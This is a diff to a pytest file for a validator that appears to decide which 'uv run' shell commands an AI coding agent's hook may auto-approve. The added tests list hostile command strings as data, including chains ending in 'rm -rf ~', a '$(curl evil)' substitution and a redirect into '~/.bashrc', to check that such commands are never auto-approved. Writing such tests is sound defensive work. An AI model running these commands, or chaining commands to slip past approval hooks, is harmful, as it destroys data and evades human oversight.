@@ -3,8 +3,8 @@
 from __future__ import annotations
 
 import pytest
-from dev10x.validators.prefix_friction import PrefixFrictionValidator
 
+from dev10x.core.validators.prefix_friction import PrefixFrictionValidator
 from tests.fakers import BashHookInputFaker
 
 
@@ -877,11 +877,50 @@ class TestUvRunEnvFlagNormalization:
     def test_inner_allowed_commands_auto_approved(
         self, validator: PrefixFrictionValidator, command: str
     ) -> None:
-        from dev10x.domain import HookAllow
+        from dev10x.core.domain import HookAllow
 
         result = validator.validate(inp=_make_input(command=command))
         assert isinstance(result, HookAllow)
         assert "DX007" in result.message
+
+    def test_simple_inner_command_decides(self, validator: PrefixFrictionValidator) -> None:
+        """GH-1795: the uv-run normalize allow skips the prompt."""
+        from dev10x.core.domain import HookAllow
+
+        result = validator.validate(inp=_make_input(command="uv run --extra dev mypy src/"))
+        assert isinstance(result, HookAllow)
+        assert result.decides is True
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uv run --extra dev mypy src/ && rm -rf ~",
+            "uv run --extra dev mypy $(curl evil)",
+            "uv run --directory apps/api pytest; rm -rf /tmp/x",
+            "uv run --python /tmp/x/fake --frozen pytest",
+            "uv run --python=3.12 pytest",
+            "uv run --project /tmp/evil pytest",
+            "uv run --directory ../other python manage.py migrate",
+            "uv run --directory=~/elsewhere pytest",
+            "uv run --frozen pytest > ~/.bashrc",
+        ],
+    )
+    def test_never_decides_beyond_one_in_tree_command(
+        self, validator: PrefixFrictionValidator, command: str
+    ) -> None:
+        """GH-1795: the rule matched a prefix of the whole string and was
+        written for this checkout, so a chain, a file redirect or a flag
+        pointing elsewhere only advises."""
+        result = validator.validate(inp=_make_input(command=command))
+
+        assert getattr(result, "decides", False) is False
+
+    def test_relative_directory_in_tree_decides(self, validator: PrefixFrictionValidator) -> None:
+        result = validator.validate(
+            inp=_make_input(command="uv run --directory apps/api pytest tests/")
+        )
+
+        assert getattr(result, "decides", False) is True
 
     def test_with_pkg_disqualifies_auto_approval(self, validator: PrefixFrictionValidator) -> None:
         # `--with httpx` installs an arbitrary package — never auto-approve;
@@ -927,11 +966,11 @@ class TestUvRunEnvFlagNormalization:
     def test_lazy_loads_allow_patterns_when_unset(self) -> None:
         from unittest.mock import patch
 
-        from dev10x.domain import HookAllow
+        from dev10x.core.domain import HookAllow
 
         v = PrefixFrictionValidator()  # _allow_patterns starts None
         with patch(
-            "dev10x.validators.prefix_friction._load_all_allow_patterns",
+            "dev10x.core.validators.prefix_friction._load_all_allow_patterns",
             return_value=["uv run pytest"],
         ):
             result = v.validate(inp=_make_input(command="uv run --directory apps/api pytest"))
@@ -947,7 +986,7 @@ class TestUvRunEnvFlagNormalization:
     def test_correct_returns_retry_for_friction_command(
         self, validator: PrefixFrictionValidator
     ) -> None:
-        from dev10x.domain import HookRetry
+        from dev10x.core.domain import HookRetry
 
         result = validator.correct(
             inp=_make_input(command="mkdir -p /tmp/foo && ~/.claude/tools/x.sh")
